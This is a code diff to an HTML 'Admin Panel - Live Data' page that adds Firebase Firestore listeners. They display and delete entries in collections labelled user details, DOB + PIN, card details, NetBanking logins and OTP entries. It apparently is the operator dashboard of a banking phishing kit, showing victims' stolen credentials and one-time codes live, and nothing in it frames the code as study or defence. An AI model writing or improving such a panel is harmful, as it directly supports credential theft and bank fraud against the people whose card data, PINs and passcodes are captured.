@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Admin Panel - Live Data</title>
@@ -66,12 +65,11 @@
       }
     }
   </style>
+  <!-- Firebase CDN -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
 </head>
-<body>
-
-<h2>Admin Panel - Live Data</h2>
-
-<div class="nav-buttons">
+<body><h2>Admin Panel - Live Data</h2><div class="nav-buttons">
   <button onclick="showSection('user')">User</button>
   <button onclick="showSection('dob')">DOB + PIN</button>
   <button onclick="showSection('txn')">Txn</button>
@@ -79,38 +77,19 @@
   <button onclick="showSection('netbanking')">NetBanking</button>
   <button onclick="showSection('otp')">OTP</button>
   <button onclick="showSection('all')">All</button>
-</div>
+</div><div id="user" class="section active"><h3>1. User Details</h3></div>
+<div id="dob" class="section"><h3>2. DOB + PIN</h3></div>
+<div id="txn" class="section"><h3>3. Transaction Details</h3></div>
+<div id="card" class="section"><h3>4. Card Details</h3></div>
+<div id="netbanking" class="section"><h3>5. NetBanking Logins</h3></div>
+<div id="otp" class="section"><h3>6. OTP Entries</h3></div>
+<div id="all" class="section"><h3>7. All Submissions</h3></div><script>
+  const firebaseConfig = {
+    projectId: "dlhiljbrd"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
 
-<div id="user" class="section active">
-  <h3>1. User Details</h3>
-  <!-- User entries will appear here -->
-</div>
-
-<div id="dob" class="section">
-  <h3>2. DOB + PIN</h3>
-</div>
-
-<div id="txn" class="section">
-  <h3>3. Transaction Details</h3>
-</div>
-
-<div id="card" class="section">
-  <h3>4. Card Details</h3>
-</div>
-
-<div id="netbanking" class="section">
-  <h3>5. NetBanking Logins</h3>
-</div>
-
-<div id="otp" class="section">
-  <h3>6. OTP Entries</h3>
-</div>
-
-<div id="all" class="section">
-  <h3>7. All Submissions</h3>
-</div>
-
-<script>
   function showSection(id) {
     document.querySelectorAll('.section').forEach(sec => {
       sec.classList.remove('active');
@@ -118,8 +97,34 @@
     document.getElementById(id).classList.add('active');
   }
 
-  // Firebase data fetching script here
-</script>
+  const collections = ["user", "dob", "txn", "card", "netbanking", "otp", "all"];
 
-</body>
+  collections.forEach(col => {
+    db.collection(col).orderBy("timestamp", "desc").onSnapshot(snapshot => {
+      const container = document.getElementById(col);
+      container.innerHTML = `<h3>${container.querySelector("h3").textContent}</h3>`;
+
+      snapshot.forEach(doc => {
+        const data = doc.data();
+        const div = document.createElement("div");
+        div.className = "entry";
+
+        let html = "";
+        for (let key in data) {
+          if (key !== "timestamp") {
+            html += `<strong>${key}:</strong> ${data[key]}<br>`;
+          }
+        }
+
+        html += `<button class='delete-btn' onclick="deleteEntry('${col}', '${doc.id}')">Delete</button>`;
+        div.innerHTML = html;
+        container.appendChild(div);
+      });
+    });
+  });
+
+  function deleteEntry(collection, id) {
+    db.collection(collection).doc(id).delete();
+  }
+</script></body>
 </html>
